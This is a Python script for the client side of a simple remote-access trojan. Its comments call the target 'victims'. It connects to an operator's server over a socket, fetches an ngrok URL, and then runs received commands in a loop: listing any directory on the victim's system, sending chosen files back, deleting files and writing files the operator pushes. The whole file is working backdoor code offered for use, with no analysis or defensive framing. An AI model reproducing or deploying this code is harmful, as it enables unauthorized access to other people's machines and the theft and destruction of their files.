# command list
# view_cwd - shows available files in directory where script is saved
# custom_dir C:\\ - lets you view any directory on the system
# download_files - will download files from directory
# send_file - sends a file from your dir to victims

import os
import socket
import urllib.request

URL = 'https://1b2c4e05.ngrok.io'
with urllib.request.urlopen(URL) as response:
	html = response.read()
print('HTTP Server: ' + URL)
	
s = socket.socket()
socket.getaddrinfo('localhost', 4040)
port = 4040
print('')
hostname = input(str('please enter the server address: '))
s.connect((hostname,port))
print('\n')
print('connected to ' + hostname + ' successfully')
print('\n')

# var   

commands = "• view_cwd - shows available files in dir where script is saved\n• custom_dir - lets you view any directory on victim's system\n• download_files - download files from specific dir\n• send_file - sends a file from your dir to victims\n"


# connection complete

# command retrieve and execute

while 1:
    command = s.recv(1024)
    command = command.decode()
    print('command received')
    print('\n')
    if command == 'view_cwd':
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print('command has been executed successfully')

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print('')
        print('command executed')
        print('')
        
    elif command == "download_files":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, 'rb')
        data = file.read()
        s.send(data)
        print('')
        print('File has been sent successfully')

    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print('')
        print('commad executed')
        print('')

    elif command == "send_file":
        filename = s.recv(6000) # change if sending file is large
        new_file = open(filename, 'wb')
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()

    else:
        print('\n')
        print('command error (unrecognised)')
